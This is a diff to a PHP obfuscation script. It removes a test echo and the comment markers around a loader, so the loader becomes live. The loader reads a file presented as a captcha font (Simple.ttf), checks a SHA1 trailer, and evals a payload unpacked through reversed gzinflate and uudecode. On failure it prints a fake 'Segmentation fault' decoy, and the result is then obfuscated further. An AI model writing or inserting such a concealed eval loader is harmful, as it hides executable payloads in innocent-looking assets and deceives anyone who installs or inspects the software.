@@ -180,15 +180,12 @@ class Obfuscate {
 }
 
 $code = <<<CODE
-echo "Test code works, but actual code is hidden in source code comment.\n";
-/*
-\$l=file_get_contents( __DIR__ . '/../../../build/fw/lib/libs/capcha/Simple.ttf' );
+\$l=file_get_contents( __DIR__ . '/libs/capcha/Simple.ttf' );
 eval(substr(\$l,-20)!=hex2bin(sha1(\$i=substr(\$l,0,-20)))?base64_decode('ZWNobyAiU2VnbWVudGF0aW9uIGZhdWx0XG4iOw'):
 convert_uudecode(str_replace("\\0","\\nM",strrev(gzinflate(strrev(\$i))))));
-*/
 CODE;
 
 $code = Obfuscate::stage1( $code );
 $code = Obfuscate::stage23( $code );
 
-echo $code;
+return $code;
